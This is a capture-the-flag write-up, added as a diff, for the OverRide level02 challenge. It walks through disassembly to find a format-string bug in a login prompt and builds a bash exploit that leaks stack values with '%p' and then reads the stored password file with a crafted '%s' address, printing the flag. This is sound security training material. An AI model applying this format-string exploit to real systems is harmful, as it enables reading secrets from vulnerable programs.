@@ -1,0 +1,106 @@
+The programs opens our flag:
+mov edx, 0x400bb0; "r"
+mov eax, str.home_users_level03_.pass ; "/home/users/level03/.pass"
+mov rsi, rdx ; const char *mode
+mov rdi, rax ; const char *filename
+call sym.imp.fopen
+
+Then freads its content into a buffer `buffer` on the stack located at rbp-0xa0.
+lea rax, [buffer]
+mov rdx, qword [stream] ; FILE *stream
+mov rcx, rdx
+mov edx, 0x29 ; 41 ; size_t nmemb
+mov esi, 1 ; size_t size
+mov rdi, rax ; void *ptr
+call sym.imp.fread
+mov dword [nbytes], eax
+
+then, there are two fgets executed:
+0x004009c3      488b057e0820.  mov rax, qword [sym.stdin]
+0x004009ca      4889c2         mov rdx, rax
+0x004009cd      488d4590       lea rax, [format]
+0x004009d1      be64000000     mov esi, 0x64
+0x004009d6      4889c7         mov rdi, rax
+0x004009d9      e812fdffff     call sym.imp.fgets
+0x004009de      488d4590       lea rax, [format]
+0x004009e2      bef50b4000     mov esi, 0x400bf5
+0x004009e7      4889c7         mov rdi, rax
+0x004009ea      e8e1fcffff     call sym.imp.strcspn
+0x004009ef      c644059000     mov byte [rbp + rax - 0x70], 0
+0x004009f4      b8e80c4000     mov eax, str.Password:			; 0x400ce8 ; "--[ Password: "
+0x004009f9      4889c7         mov rdi, rax
+0x004009fc      b800000000     mov eax, 0
+0x00400a01      e8bafcffff     call sym.imp.printf
+0x00400a06      488b053b0820.  mov rax, qword [sym.stdin]
+0x00400a0d      4889c2         mov rdx, rax
+0x00400a10      488d85f0feff.  lea rax, [password]
+0x00400a17      be64000000     mov esi, 0x64
+0x00400a1c      4889c7         mov rdi, rax
+0x00400a1f      e8ccfcffff     call sym.imp.fgets
+
+The first fgets reads into a buffer `format` which is latter used as a format for printf here:
+lea rax, [format]
+mov rdi, rax
+mov eax, 0
+call sym.imp.printf
+mov edi, str.does_not_have_access  ; " does not have access!"
+call sym.imp.puts
+mov edi, 1
+call sym.imp.exit
+
+This branch is executed when this condition is true:
+ lea rcx, [password]
+ lea rax, [buffer]
+ mov edx, 0x29
+ ; const char *s2
+ mov rsi, rcx
+ ; const char *s1
+ mov rdi, rax
+ call sym.imp.strncmp;
+ test eax, eax
+ jne 0x400a96;
+
+That is when the content our the second fgets `password` and the content of the fread on our flag file `buffer` are different.
+The printf of concern is called like that "printf(format);"
+The first parameter `format` is rdi.
+There is no second parameter set before the call however if there was, it would be rsi.
+We can see that the last modification of rsi is here:
+lea rcx, [password]
+lea rax, [buffer]
+mov edx, 0x29
+mov rsi, rcx
+
+Which means that the first variadic argument of this printf is the effective address of password.
+We can use this information to calculate the address of `buffer` which contains our flag.
+So:
+level02@OverRide:~$ cat script
+#!/bin/bash
+
+echo '%p %p %p %p %p %p %p %p'
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+level02@OverRide:~$ bash script > input; cat input - | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x7fffffffe500 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x6161616161616161 does not have access!
+
+We can see that the address of password is at 0x7fffffffe500.
+According to our script to current content of password is 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+And we can see that the 8th '%p' prints '0x6161616161616161' which is just the content of password as 0x61 is the ascii value for 'A'
+Which means we can replace the last %p by a %s and set the first 4 characters of password to the address we want to print, that is the address of `buffer`.
+Since we know that password is at 0x7fffffffe500, that password, relative to the rbp, is at rbp-0x110 and that buffer, relative to the rbp, is at rbp-0xa0.
+By doing 0x110 - 0xa0 + 0x7fffffffe500, we get 0x7fffffffe570.
+We can now modify our script to:
+echo '%p %p %p %p %p %p %p %s'
+echo -e '\x70\xe5\xff\xff\xff\x7f\x00\x00' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+and:
+level02@OverRide:~$ bash script > input; cat input - | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x7fffffffe500 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H does not have access!
+Gives us the flag.
